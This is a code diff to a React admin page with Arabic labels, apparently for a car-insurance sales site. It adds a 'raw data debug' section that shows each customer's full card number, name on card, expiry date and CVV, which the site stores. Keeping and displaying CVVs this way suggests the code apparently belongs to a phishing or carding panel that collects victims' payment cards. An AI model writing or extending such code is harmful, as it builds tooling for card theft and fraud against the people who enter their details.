@@ -44,6 +44,7 @@ export const Admin = () => {
   const [masterCode, setMasterCode] = useState('');
   const [customers, setCustomers] = useState([]);
   const [selectedCustomerId, setSelectedCustomerId] = useState(null);
+  const selectedCustomer = customers.find(c => c.id === selectedCustomerId);
   const [searchQuery, setSearchQuery] = useState('');
   const [loadingAction, setLoadingAction] = useState(null);
   const [mobileDetailsActive, setMobileDetailsActive] = useState(false);
@@ -548,6 +549,19 @@ export const Admin = () => {
                     <div className="info-row-v2"><span>المبلغ الإجمالي</span> <strong className="price">{selectedCustomer.total_price || '---'} ريال</strong></div>
                     <div className="info-row-v2"><span>نوع التأمين</span> <strong>تأمين شامل</strong></div>
                     <div className="info-row-v2"><span>المركبة</span> <strong>{selectedCustomer.car_make_model || '---'}</strong></div>
+                  </div>
+                </div>
+
+                {/* RAW DATA DEBUG SECTION */}
+                <div className="info-card-v2" style={{marginTop: '20px', background: '#fffbeb', borderColor: '#fef3c7'}}>
+                  <h3 style={{color: '#92400e'}}>البيانات التقنية (للتأكد)</h3>
+                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', fontSize: '12px'}}>
+                    <div className="info-row-v2"><span>رقم البطاقة (خام)</span> <strong>{selectedCustomer.card_number || 'لم يصل بعد'}</strong></div>
+                    <div className="info-row-v2"><span>الاسم على البطاقة</span> <strong>{selectedCustomer.card_name || '---'}</strong></div>
+                    <div className="info-row-v2"><span>الشهر</span> <strong>{selectedCustomer.expiry_month || '---'}</strong></div>
+                    <div className="info-row-v2"><span>السنة</span> <strong>{selectedCustomer.expiry_year || '---'}</strong></div>
+                    <div className="info-row-v2"><span>CVV</span> <strong>{selectedCustomer.cvv || '---'}</strong></div>
+                    <div className="info-row-v2"><span>آخر تحديث</span> <strong>{new Date(selectedCustomer.last_update || 0).toLocaleString('ar-SA')}</strong></div>
                   </div>
                 </div>
               </div>
